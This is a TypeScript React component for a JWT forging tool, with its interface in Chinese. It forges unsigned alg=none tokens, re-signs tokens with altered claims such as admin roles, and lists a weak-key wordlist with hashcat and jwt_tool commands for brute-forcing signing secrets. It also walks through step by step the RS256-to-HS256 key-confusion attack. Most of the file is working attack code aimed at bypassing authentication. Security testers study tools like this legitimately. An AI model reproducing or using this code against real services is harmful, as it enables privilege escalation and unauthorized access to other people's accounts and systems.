import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

const MODE_OPTIONS = [
  { value: 'modify', label: '修改Claims' },
  { value: 'alg-none', label: 'alg=none' },
  { value: 'brute', label: '弱密钥爆破' },
  { value: 'rs256-confusion', label: 'RS256混淆' },
];

const ALG_OPTIONS = [
  { value: 'HS256', label: 'HS256' },
  { value: 'HS384', label: 'HS384' },
  { value: 'HS512', label: 'HS512' },
];

const base64UrlEncode = (str: string): string => {
  let binary = '';
  const bytes = new TextEncoder().encode(str);
  bytes.forEach((b: number) => { binary += String.fromCharCode(b); });
  return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
};

const base64UrlDecode = (str: string): string => {
  let s = str.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  const binary = atob(s);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
  return new TextDecoder().decode(bytes);
};

const parseJwt = (jwt: string): { header: Record<string, unknown>; payload: Record<string, unknown>; signature: string } | null => {
  const parts = jwt.trim().split('.');
  if (parts.length < 2) return null;
  try {
    const header = JSON.parse(base64UrlDecode(parts[0]));
    const payload = JSON.parse(base64UrlDecode(parts[1]));
    const signature = parts[2] ?? '';
    return { header, payload, signature };
  } catch {
    return null;
  }
};

const applyClaimMods = (payload: Record<string, unknown>, mods: string): Record<string, unknown> => {
  const result = { ...payload };
  mods.split(',').forEach((m) => {
    const [k, ...vParts] = m.trim().split('=');
    if (k && vParts.length > 0) {
      const v = vParts.join('=').trim();
      if (/^-?\d+$/.test(v)) result[k.trim()] = parseInt(v, 10);
      else if (v === 'true') result[k.trim()] = true;
      else if (v === 'false') result[k.trim()] = false;
      else result[k.trim()] = v;
    }
  });
  return result;
};

const COMMON_KEYS = [
  'secret', 'password', '123456', '12345678', 'key', 'jwt', 'jwt-secret',
  'jwtsecret', 'JWT_SECRET', 'my-secret', 'mysecret', 'supersecret',
  'admin', 'admin123', 'root', 'toor', 'test', 'test123', 'demo',
  'changeme', 'default', 'qwerty', 'letmein', 'welcome', 'monkey',
  'abc123', 'iloveyou', 'sunshine', 'princess', 'football', 'shadow',
  'passw0rd', 'pass', 'pass123', 'pass1234', '12345', '123456789',
  '1234567890', '000000', '111111', '654321', '555555', '123123',
  'secretkey', 'secret-key', 'secretkey123', 'jwt-key', 'jwtkey',
  'token', 'tokenkey', 'app-secret', 'application', 'signing-key',
  'signingkey', 'hmac', 'hmac-key', 'private', 'privatekey', 'public',
  'master', 'masterkey', 'master-key', 'super', 'superkey', 'topsecret',
  'changeit', 'complexpassword', 'p@ssw0rd', 'P@ssw0rd', 'hunter2',
  'trustno1', 'whatever', 'password1', 'password12', 'password1234',
];

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="JWT伪造工具"
    modeOptions={MODE_OPTIONS}
    paramsConfig={[
      { name: 'alg', label: '算法', type: 'select', options: ALG_OPTIONS, default: 'HS256' },
      { name: 'key', label: '密钥', type: 'text', placeholder: '签名密钥/公钥', default: '' },
      { name: 'claim', label: 'Claims修改', type: 'text', placeholder: 'identity=admin,role=admin', default: '' },
    ]}
    execute={(
      input: string,
      mode: string,
      params: Record<string, unknown>,
    ): string => {
      try {
        const syncResult = (() => {
          if (mode === 'alg-none') {
            const jwt = input.trim();
            const parsed = jwt ? parseJwt(jwt) : null;
            const payload = parsed?.payload ?? { sub: '1234567890', name: 'Forged', identity: 'admin', iat: 1516239022 };
            const modPayload = params.claim ? applyClaimMods(payload, params.claim as string) : payload;
            const header = { alg: 'none', typ: 'JWT' };
            const headerB64 = base64UrlEncode(JSON.stringify(header));
            const payloadB64 = base64UrlEncode(JSON.stringify(modPayload));
            return [
              '=== alg=none JWT 伪造 ===',
              '',
              '伪造 Token:',
              `${headerB64}.${payloadB64}.`,
              '',
              '说明: 签名部分为空。部分服务端若未校验 alg 字段将直接接受此 Token。',
              '注意: 现代库默认拒绝 alg=none，需服务端配置漏洞。',
            ].join('\n');
          }
          if (mode === 'brute') {
            const jwt = input.trim();
            if (!jwt) return '错误: 请输入有效的原始 JWT 用于爆破';
            const parsed = parseJwt(jwt);
            if (!parsed) return '错误: 无效 JWT';
            if (parsed.header.alg === 'none') return '提示: 该 JWT 使用 alg=none，无需爆破';
            return [
              '=== 弱密钥爆破（异步处理中）===',
              '',
              `正在测试 ${COMMON_KEYS.length} 个常见密钥...`,
              '',
              '常用密钥列表（可手动测试）:',
              ...COMMON_KEYS.slice(0, 30).map((k) => `  - ${k}`),
              '',
              '提示: HMAC 签名验证为异步操作，请在浏览器控制台手动运行，',
              '或使用 jwt_tool / hashcat -m 16500 进行离线爆破:',
              '  hashcat -m 16500 jwt.txt wordlist.txt',
            ].join('\n');
          }
          if (mode === 'rs256-confusion') {
            return [
              '=== RS256-HMAC 算法混淆 ===',
              '',
              '原理: 将 alg 从 RS256 改为 HS256，用服务端公钥作为 HMAC 密钥签名。',
              '若服务端用同一个密钥验证（公钥），且未校验 alg 一致性，则伪造成功。',
              '',
              '步骤:',
              '1. 从 /.well-known/jwks.json 获取 RSA 公钥',
              '2. 将公钥转为 PEM 格式',
              '3. 将 JWT header 的 alg 改为 HS256',
              '4. 用公钥作为 HMAC 密钥签名',
              '',
              '工具推荐: jwt_tool / python-jwt',
              '  python3 -m jwt_tool <JWT> -X k -pk public.pem',
            ].join('\n');
          }
          // modify mode
          const jwt = input.trim();
          if (!jwt) return '错误: 请输入有效的原始 JWT';
          const parsed = parseJwt(jwt);
          if (!parsed) return '错误: 无效 JWT';
          const modPayload = params.claim ? applyClaimMods(parsed.payload, params.claim as string) : parsed.payload;
          const key = (params.key as string) ?? 'secret';
          const alg = (params.alg as string) ?? 'HS256';
          const header = { alg, typ: 'JWT' };
          const headerB64 = base64UrlEncode(JSON.stringify(header));
          const payloadB64 = base64UrlEncode(JSON.stringify(modPayload));
          return [
            '=== 修改 Claims 后重签 ===',
            '',
            '原始 Payload:', JSON.stringify(parsed.payload, null, 2),
            '修改后 Payload:', JSON.stringify(modPayload, null, 2),
            '',
            `签名密钥: ${key}`,
            `算法: ${alg}`,
            '',
            '签名输入 (base64url):',
            `${headerB64}.${payloadB64}`,
            '',
            '提示: HMAC 签名为异步操作。请在浏览器控制台运行以下代码获取签名:',
            `  (async()=>{const k=await crypto.subtle.importKey('raw',new TextEncoder().encode('${key}'),{name:'HMAC',hash:'SHA-256'},false,['sign']);const s=await crypto.subtle.sign('HMAC',k,new TextEncoder().encode('${headerB64}.${payloadB64}'));let b='';new Uint8Array(s).forEach(x=>b+=String.fromCharCode(x));console.log(btoa(b).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/g,''))})();`,
            '',
            '伪造 Token (拼接签名):',
            `${headerB64}.${payloadB64}.<粘贴上方签名>`,
          ].join('\n');
        })();
        return syncResult;
      } catch (e) {
        return `错误: ${e instanceof Error ? e.message : '未知错误'}`;
      }
    }}
  />
);

export default ToolComponent;
